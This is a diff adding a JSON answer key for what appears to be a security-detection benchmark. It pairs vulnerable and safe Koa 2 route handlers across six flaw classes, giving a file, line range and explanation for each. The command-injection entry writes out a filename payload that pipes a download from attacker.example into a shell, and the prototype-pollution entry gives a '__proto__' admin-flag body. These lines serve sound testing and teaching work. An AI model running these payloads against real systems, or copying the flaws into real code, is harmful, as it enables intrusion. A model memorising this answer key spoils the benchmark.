@@ -1,0 +1,150 @@
+{
+  "family": "koa",
+  "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+  "cases": [
+    {
+      "id": "koa-dashboard-pdf-render",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/render-jobs.js",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": ["high", "critical"],
+      "route": "POST /render-jobs",
+      "line": 47,
+      "lineRange": [42, 49],
+      "runtimeVerifiable": true,
+      "why": "The request body's filename lands in the output path and then inside a template string passed to child_process.exec, which runs the whole line through /bin/sh; the surrounding double quotes do not stop command substitution, so a filename of $(curl attacker.example|sh) executes as the application user."
+    },
+    {
+      "id": "koa-dashboard-png-render",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/preview-jobs.js",
+      "kind": "safe",
+      "pairedWith": "koa-dashboard-pdf-render",
+      "why": "The same renderer invocation goes through execFile with a fixed argv array so no shell parses it, and the filename is rejected up front unless it matches a lowercase slug pattern."
+    },
+    {
+      "id": "koa-export-detail-panel",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/export-detail.js",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": ["high", "critical"],
+      "route": "GET /exports/:exportId",
+      "line": 37,
+      "lineRange": [34, 39],
+      "runtimeVerifiable": true,
+      "why": "The detail handler selects the export row on the path id alone, so any signed-in user can read another tenant's export metadata and, because the handler then signs a download URL for its storage key, fetch the exported data itself. The list handler above it filters on ctx.state.user.orgId, which is the clause the detail query is missing."
+    },
+    {
+      "id": "koa-statement-detail-panel",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/statement-detail.js",
+      "kind": "safe",
+      "pairedWith": "koa-export-detail-panel",
+      "why": "The same detail panel and the same signed download URL, but the row is selected with both the path id and ctx.state.user.orgId in the WHERE clause, so another tenant's statement yields no row and the handler throws 404."
+    },
+    {
+      "id": "koa-accounting-connection-sync",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/invoice-sync.js",
+      "kind": "vulnerable",
+      "category": "verbose_error_response",
+      "severityBand": ["low", "medium"],
+      "route": "POST /connections/:connectionId/sync",
+      "line": 50,
+      "lineRange": [46, 56],
+      "runtimeVerifiable": true,
+      "why": "The catch block copies the exception's message, stack trace, failing SQL statement and the upstream provider's raw response body into the response, handing any caller who can make the sync fail the server's file paths, module layout, database schema and third-party payloads."
+    },
+    {
+      "id": "koa-ledger-connection-sync",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/ledger-sync.js",
+      "kind": "safe",
+      "pairedWith": "koa-accounting-connection-sync",
+      "why": "The same failure path logs the exception, the provider status and the provider body server-side against a generated incident id, and the response carries only a fixed sentence and that id, so nothing about the internals crosses the boundary."
+    },
+    {
+      "id": "koa-ticket-attachment-store",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/attachment-upload.js",
+      "kind": "vulnerable",
+      "category": "unrestricted_file_upload",
+      "severityBand": ["high", "critical"],
+      "route": "POST /tickets/:ticketId/attachments",
+      "line": 47,
+      "lineRange": [44, 48],
+      "runtimeVerifiable": true,
+      "why": "Nothing checks the content type or the extension: the uploaded file keeps the caller's own filename and extension and is copied into a directory nginx serves directly, so an upload named payload.php or note.html is fetched back from /uploads and executed or rendered in the site's origin."
+    },
+    {
+      "id": "koa-profile-avatar-store",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/avatar-upload.js",
+      "kind": "safe",
+      "pairedWith": "koa-ticket-attachment-store",
+      "why": "The same multipart upload, but the declared content type must be one of three image types, the file's own magic bytes must agree with it, the size is capped, the stored name is a UUID with the extension taken from the allowlist rather than from the caller, and the destination is outside any web-served directory."
+    },
+    {
+      "id": "koa-notification-toggle-patch",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/notification-preferences.js",
+      "kind": "vulnerable",
+      "category": "prototype_pollution",
+      "severityBand": ["medium", "high"],
+      "route": "PATCH /notification-preferences",
+      "line": 29,
+      "lineRange": [22, 31],
+      "runtimeVerifiable": true,
+      "why": "The recursive merge walks every key of the parsed request body without excluding __proto__ or constructor, so a body of {\"__proto__\":{\"isAdmin\":true}} recurses into Object.prototype and assigns onto it, adding that property to every object in the process for the rest of its lifetime."
+    },
+    {
+      "id": "koa-appearance-toggle-patch",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/display-preferences.js",
+      "kind": "safe",
+      "pairedWith": "koa-notification-toggle-patch",
+      "why": "The same recursive merge over the same request body, but keys named __proto__, constructor or prototype are skipped and only own properties are copied, so the walk can never reach a prototype object."
+    },
+    {
+      "id": "koa-team-member-role-change",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/team-roles.js",
+      "kind": "vulnerable",
+      "category": "broken_function_level_authorization",
+      "severityBand": ["high", "critical"],
+      "route": "PUT /teams/:teamId/members/:userId/role",
+      "line": 57,
+      "lineRange": [49, 63],
+      "runtimeVerifiable": true,
+      "why": "requireUser proves a session and loadTeam proves the caller belongs to the team, but the caller's own role — which loadTeam has already put on ctx.state.team — is never compared against anything before the role is written, so any ordinary member can promote themselves or anyone else to owner."
+    },
+    {
+      "id": "koa-project-collaborator-role-change",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/project-access.js",
+      "kind": "safe",
+      "pairedWith": "koa-team-member-role-change",
+      "why": "The same membership-loading middleware and the same role update, but the handler throws 403 unless the caller's own assignment on that project is lead, so membership alone does not confer the ability to change roles."
+    }
+  ]
+}
